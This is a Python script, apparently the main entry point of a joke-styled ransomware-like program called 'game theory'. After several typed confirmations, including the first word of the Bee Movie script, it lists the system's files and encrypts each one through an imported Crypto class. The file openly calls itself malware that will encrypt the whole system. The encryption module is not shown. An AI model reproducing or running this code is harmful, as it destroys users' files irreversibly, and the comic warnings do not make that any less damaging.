from gametheory.crypto import Crypto
from termcolor import cprint
import time

KEY_SIZE = 32
IV_SIZE = 16


def main():
    input(
        "Hello. Welcome to game theory.\nTHIS IS A MALWARE THAT WILL ENCRYPT YOUR WHOLE SYSTEM. DO NOT USE IT ON YOUR PERSONAL MACHINE. DO YOU UNDERSTAND THIS? [press ENTER if you understand this]")
    input('YOU WILL LOSE EVERYTHING. PRESS [ENTER] IF YOU ARE OK WITH THIS\n')
    script = input(
        "Input the first word of the bee movie script below if you understand this:\n").lower()
    if script == "according":
        crypto = Crypto(KEY_SIZE, IV_SIZE)
        files = crypto.get_files()
        print("I'm going to print all the files I will encrypt, literally forever.")
        print(files)
        time.sleep(2)
        input(
            "Press enter to forever encrypt every single one of those [ENTER] ")
        print("whatever")
        for f in files:
            crypto.encrypt_file(f)

if __name__ == "__main__":
    main()
